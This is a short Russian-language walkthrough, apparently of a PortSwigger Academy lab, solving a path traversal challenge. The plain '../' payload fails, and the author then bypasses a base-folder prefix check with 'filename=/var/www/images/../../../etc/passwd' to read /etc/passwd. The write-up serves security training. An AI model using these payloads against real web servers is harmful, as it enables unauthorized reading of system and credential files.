При запросах к веб ресурсу обнаружим, что каждая картинка скачивается отдельным GET запросом, и передадим ее в repeater
```
GET /image?filename=/var/www/images/72.jpg
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/3.%20Directory%20traversal/5.%20File%20path%20traversal%2C%20validation%20of%20start%20of%20path/pics%20for%20walktrough/1.png)

Попробуем применить стандартную PathTraversal уязвимость
```
GET /image?filename=../../../../etc/passwd
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/3.%20Directory%20traversal/5.%20File%20path%20traversal%2C%20validation%20of%20start%20of%20path/pics%20for%20walktrough/2.png)
Видим, что у нас ничего не вышло 

Иногда разработчики закладывают такой функционал, чтобы имя файла, заданное пользователем, начиналось с ожидаемой базовой папки, такой как `/var/www/images`. Воспользуемся этим фактором
```
GET /image?filename=/var/www/images/../../../etc/passwd
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/3.%20Directory%20traversal/5.%20File%20path%20traversal%2C%20validation%20of%20start%20of%20path/pics%20for%20walktrough/3.png)
И получим доступ до желанного файла
